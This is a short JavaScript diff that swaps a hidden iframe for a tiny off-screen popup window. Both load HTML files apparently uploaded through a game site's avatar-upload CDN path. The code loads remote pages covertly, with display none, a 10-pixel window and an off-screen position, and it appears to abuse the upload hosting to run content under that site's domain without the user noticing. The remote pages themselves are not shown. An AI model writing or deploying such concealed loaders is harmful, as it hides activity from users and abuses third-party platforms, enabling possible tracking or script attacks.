@@ -1,5 +1,5 @@
-var iframe = document.createElement("iframe");
-// iframe.src = "https://cdn.deeeep.io/uploads/avatars/20987821-ff196b9ba7f2cc76c95a8579967021c8.html";
-iframe.src = "https://cdn.deeeep.io/uploads/avatars/20987710-d71fcc9ab2035376abb85fbb0bd734db.html";
-iframe.style.display = "none";
-document.body.appendChild(iframe);
+// LOADS DEEEEPIO, USES MORE BANDWIDTH
+// "https://cdn.deeeep.io/uploads/avatars/20987821-ff196b9ba7f2cc76c95a8579967021c8.html";
+
+// MINIMAL VERSION
+window.open("https://cdn.deeeep.io/uploads/avatars/20987710-87f5ea144bfe979de99b96b426ddf59f.html", "_blank", "toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none", "");
